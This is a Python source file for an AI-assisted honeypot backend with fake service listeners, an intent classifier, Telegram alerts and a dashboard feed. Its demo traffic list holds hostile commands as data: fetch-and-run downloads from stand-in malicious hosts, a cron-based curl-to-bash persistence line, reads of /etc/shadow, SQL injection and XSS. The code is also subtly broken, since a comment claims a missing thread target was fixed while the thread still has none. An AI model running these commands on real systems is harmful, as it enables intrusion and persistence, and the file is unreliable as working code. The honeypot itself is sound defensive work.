"""
TrapForge - AI-Powered Adaptive Honeypot
Backend: FastAPI + Socket Honeypot + ML Intent Classifier + LLM Deception Engine
"""

import asyncio
import socket
import threading
import json
import hashlib
import random
import re
import os
from datetime import datetime
from typing import Optional
from collections import deque

from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import uvicorn
import httpx

from classifier import AttackClassifier
from deception_engine import DeceptionEngine, LLM_AVAILABLE, client
from attack_store import AttackStore


# ── Telegram config ────────────────────────────────────────────────────────────
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT  = os.getenv("TELEGRAM_CHAT_ID")

app = FastAPI(title="TrapForge API", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

classifier = AttackClassifier()
deception = DeceptionEngine()
store = AttackStore()
connected_clients: list[WebSocket] = []

# Capture the main event loop at startup so background threads can
# safely schedule coroutines onto it.
_main_loop: asyncio.AbstractEventLoop | None = None


# ── Telegram alert ─────────────────────────────────────────────────────────────
async def send_telegram_alert(event: dict):
    """Send a Telegram message for high/critical severity attacks."""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT:
        return
    emoji = {"critical": "🚨", "high": "⚠️", "medium": "🔵", "low": "🟢"}
    sev = event.get("severity", "low")
    text = (
        f"{emoji.get(sev, '❓')} *TrapForge Alert*\n"
        f"IP: `{event['ip']}` ({event.get('country', {}).get('country', '?')})\n"
        f"Service: {event['service']}  |  Severity: {sev.upper()}\n"
        f"Intent: {event.get('intent', '')}\n"
        f"Command: `{event.get('command', '')[:80]}`"
    )
    try:
        async with httpx.AsyncClient(timeout=5) as c:
            await c.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT, "text": text, "parse_mode": "Markdown"},
            )
    except Exception as e:
        print(f"[TrapForge] Telegram alert failed: {e}")


# ── WebSocket broadcast ────────────────────────────────────────────────────────
async def broadcast(event: dict):
    """Push real-time event to all connected dashboard clients."""
    dead = []
    for ws in connected_clients:
        try:
            await ws.send_json(event)
        except Exception:
            dead.append(ws)
    for ws in dead:
        if ws in connected_clients:
            connected_clients.remove(ws)


def broadcast_from_thread(event: dict):
    """Thread-safe broadcast — always uses the captured main loop."""
    if _main_loop and _main_loop.is_running():
        asyncio.run_coroutine_threadsafe(broadcast(event), _main_loop)


# ── WebSocket endpoint ─────────────────────────────────────────────────────────
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    connected_clients.append(websocket)
    await websocket.send_json({"type": "history", "data": store.get_recent(50)})
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if websocket in connected_clients:
            connected_clients.remove(websocket)


# ── REST endpoints ─────────────────────────────────────────────────────────────
@app.get("/api/stats")
async def get_stats():
    return store.get_stats()


@app.get("/api/attacks")
async def get_attacks(limit: int = 100):
    return store.get_recent(limit)


@app.get("/api/attack/{attack_id}")
async def get_attack(attack_id: str):
    return store.get_by_id(attack_id)


@app.get("/api/heatmap")
async def get_heatmap():
    return store.get_geo_heatmap()


@app.get("/api/llm-status")
async def llm_status():
    return {
        "provider": "Grok (xAI) — grok-3-fast" if LLM_AVAILABLE else "Template engine (set XAI_API_KEY to enable Grok)",
        "live": LLM_AVAILABLE,
    }



@app.post("/api/narrate")
async def narrate_attack(payload: dict):
    events = payload.get("events", [])
    if not events:
        return {"narrative": "No events provided."}

    if not LLM_AVAILABLE:
        intents = list({e.get("intent", "unknown") for e in events})
        services = list({e.get("service", "?") for e in events})
        severity = max(
            events,
            key=lambda e: {"critical": 4, "high": 3, "medium": 2, "low": 1}.get(e.get("severity", "low"), 0),
        )
        return {
            "narrative": (
                f"Attacker from {events[0].get('ip', 'unknown')} targeted {', '.join(services)} services. "
                f"Techniques observed: {', '.join(intents)}. "
                f"Most severe action: [{severity.get('severity', '?').upper()}] {severity.get('command', '')}. "
                f"Total commands captured: {len(events)}. "
                f"Recommendation: block IP and review affected services immediately."
            ),
            "provider": "template",
        }

    event_lines = "\n".join(
        f"- [{e.get('service')}] {e.get('command', '?')} → intent: {e.get('intent', '?')} (severity: {e.get('severity', '?')})"
        for e in events[:20]
    )

    try:
        resp = client.chat.completions.create(
            model="grok-3-fast",
            messages=[
                {
                    "role": "system",
                    "content": (
                        "You are a senior threat intelligence analyst. "
                        "Write a concise, professional threat narrative (3-4 sentences) "
                        "describing what the attacker was attempting, their skill level, "
                        "likely goal, and recommended defensive action. "
                        "Use plain English suitable for a security report."
                    ),
                },
                {
                    "role": "user",
                    "content": f"Attacker IP: {events[0].get('ip', 'unknown')}\nCommands observed:\n{event_lines}\n\nWrite the threat narrative:",
                },
            ],
            max_tokens=200,
            temperature=0.4,
        )
        return {
            "narrative": resp.choices[0].message.content.strip(),
            "provider": "grok-3-fast",
        }
    except Exception as e:
        return {"narrative": f"Grok narration error: {e}", "provider": "error"}


# ── Honeypot connection handler ────────────────────────────────────────────────
def handle_honeypot_connection(conn, addr, port, service_name):
    """Handle an incoming attacker connection synchronously."""
    ip = addr[0]
    session_log = []

    conn.settimeout(120)

    try:
        banner = deception.get_banner(service_name)
        if not banner.endswith(("\r\n", "\n")):
            banner += "\r\n"
        conn.sendall(banner.encode())

        if service_name == "SSH":
            conn.sendall(b"root@prod-server-01:~# ")

        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break

                command = data.decode("utf-8", errors="replace").strip()
                if not command:
                    if service_name == "SSH":
                        conn.sendall(b"root@prod-server-01:~# ")
                    continue

                session_log.append(command)
                print(f"[TrapForge] [{service_name}:{port}] {ip} → {command!r}")

                intent = classifier.classify(command, service_name)
                response = deception.respond(command, service_name, intent)

                conn.sendall((response + "\r\n").encode())
                if service_name == "SSH":
                    conn.sendall(b"root@prod-server-01:~# ")

                attack_id = hashlib.md5(
                    f"{ip}{datetime.utcnow().isoformat()}{command}".encode()
                ).hexdigest()[:12]

                event = {
                    "id": attack_id,
                    "timestamp": datetime.utcnow().isoformat(),
                    "ip": ip,
                    "port": port,
                    "service": service_name,
                    "command": command,
                    "intent": intent["label"],
                    "confidence": round(intent["confidence"], 3),
                    "severity": intent["severity"],
                    "response_sent": response[:120],
                    "country": _fake_geo(ip),
                    "session_commands": len(session_log),
                    "source": "live",
                }

                store.add(event)
                broadcast_from_thread({"type": "attack", "data": event})

                # ── FIX: Telegram alert for high/critical events ───────────────
                if intent["severity"] in ("critical", "high") and _main_loop:
                    asyncio.run_coroutine_threadsafe(
                        send_telegram_alert(event), _main_loop
                    )
                # ─────────────────────────────────────────────────────────────

            except socket.timeout:
                print(f"[TrapForge] [{service_name}] {ip} session timed out")
                break
            except Exception as e:
                print(f"[TrapForge] [{service_name}] recv error: {e}")
                break
    finally:
        conn.close()


# ── Geo helper ─────────────────────────────────────────────────────────────────
def _fake_geo(ip: str) -> dict:
    fake_locations = [
        {"country": "Russia",  "city": "Moscow",    "lat": 55.75,  "lon": 37.62,  "flag": "RU"},
        {"country": "China",   "city": "Beijing",   "lat": 39.91,  "lon": 116.39, "flag": "CN"},
        {"country": "USA",     "city": "New York",  "lat": 40.71,  "lon": -74.00, "flag": "US"},
        {"country": "Romania", "city": "Bucharest", "lat": 44.43,  "lon": 26.10,  "flag": "RO"},
        {"country": "Brazil",  "city": "São Paulo", "lat": -23.55, "lon": -46.63, "flag": "BR"},
        {"country": "Iran",    "city": "Tehran",    "lat": 35.69,  "lon": 51.39,  "flag": "IR"},
        {"country": "Nigeria", "city": "Lagos",     "lat": 6.52,   "lon": 3.37,   "flag": "NG"},
        {"country": "India",   "city": "Mumbai",    "lat": 19.07,  "lon": 72.87,  "flag": "IN"},
        {"country": "Germany", "city": "Berlin",    "lat": 52.52,  "lon": 13.40,  "flag": "DE"},
        {"country": "Ukraine", "city": "Kyiv",      "lat": 50.45,  "lon": 30.52,  "flag": "UA"},
    ]
    try:
        seed = int(ip.replace(".", "")[:6]) % len(fake_locations)
    except Exception:
        seed = 0
    return fake_locations[seed]


# ── Honeypot listener ──────────────────────────────────────────────────────────
def run_honeypot_listener(port: int, service_name: str):
    """Start a TCP honeypot on a given port."""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", port))
        server.listen(10)
        print(f"[TrapForge] {service_name} honeypot listening on port {port}")
        while True:
            try:
                conn, addr = server.accept()
                t = threading.Thread(
                    target=handle_honeypot_connection,
                    args=(conn, addr, port, service_name),
                    daemon=True,
                )
                t.start()
            except Exception as e:
                print(f"[TrapForge] Accept error on {service_name}: {e}")
    except Exception as e:
        print(f"[TrapForge] Could not bind {service_name} on {port}: {e}")


# ── Demo attacker ──────────────────────────────────────────────────────────────
def run_demo_attacker():
    """
    Simulates background attack traffic.
    Broadcasts the first 8 events to warm up the dashboard,
    then logs silently so live terminal attacks stand out clearly.
    """
    import time

    BROADCAST_LIMIT = 8

    demo_attacks = [
        (2222, "SSH",   "root",                                                                         "script_kiddie"),
        (2222, "SSH",   "ls -la /etc/passwd",                                                           "recon"),
        (2222, "SSH",   "cat /etc/shadow",                                                              "credential_theft"),
        (2121, "FTP",   "USER admin\r\nPASS password123",                                               "brute_force"),
        (8080, "HTTP",  "GET /admin/config.php HTTP/1.1",                                               "web_exploit"),
        (8080, "HTTP",  "' OR 1=1; DROP TABLE users;--",                                                "sql_injection"),
        (2222, "SSH",   "wget http://malware.ru/bot.sh && chmod +x bot.sh && ./bot.sh",                 "malware_deploy"),
        (3307, "MySQL", "SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4--",                        "sql_injection"),
        (2222, "SSH",   "find / -perm -4000 2>/dev/null",                                               "privilege_escalation"),
        (8080, "HTTP",  "<script>document.cookie</script>",                                             "xss"),
        (2222, "SSH",   "crontab -l && echo '* * * * * curl http://c2.evil.com/shell.sh|bash' >> /tmp/cron", "apt"),
        (2121, "FTP",   "RETR /etc/passwd",                                                             "data_exfil"),
    ]

    attacks_broadcast = 0

    while True:
        time.sleep(random.uniform(4, 9))
        ip_base = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
        port, service, command, _ = random.choice(demo_attacks)

        intent = classifier.classify(command, service)
        response = deception.respond(command, service, intent)

        attack_id = hashlib.md5(
            f"{ip_base}{datetime.utcnow().isoformat()}".encode()
        ).hexdigest()[:12]

        event = {
            "id": attack_id,
            "timestamp": datetime.utcnow().isoformat(),
            "ip": ip_base,
            "port": port,
            "service": service,
            "command": command,
            "intent": intent["label"],
            "confidence": round(intent["confidence"], 3),
            "severity": intent["severity"],
            "response_sent": response[:120],
            "country": _fake_geo(ip_base),
            "session_commands": random.randint(1, 15),
            "source": "demo",
        }

        store.add(event)

        if attacks_broadcast < BROADCAST_LIMIT:
            broadcast_from_thread({"type": "attack", "data": event})
            attacks_broadcast += 1
            if attacks_broadcast == BROADCAST_LIMIT:
                print("[TrapForge] Dashboard warm-up done — background logging only from here.")


# ── Startup ────────────────────────────────────────────────────────────────────
@app.on_event("startup")
async def startup():
    global _main_loop
    _main_loop = asyncio.get_event_loop()

    honeypots = [
        (2222, "SSH"),
        (2121, "FTP"),
        (8080, "HTTP"),
        (3306, "MySQL"),
        (2525, "SMTP"),
    ]
    for port, service in honeypots:
        t = threading.Thread(
            target=run_honeypot_listener, args=(port, service), daemon=True
        )
        t.start()

    # FIX: target= was missing — demo attacker never ran before
    demo_thread = threading.Thread(daemon=True)
    demo_thread.start()

    print("[TrapForge] All honeypots active. Demo attacker running.")
    print("[TrapForge] Live attack:  rlwrap nc localhost 2222")
    print("[TrapForge] Script demo:  bash demo_attack.sh")


if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=False)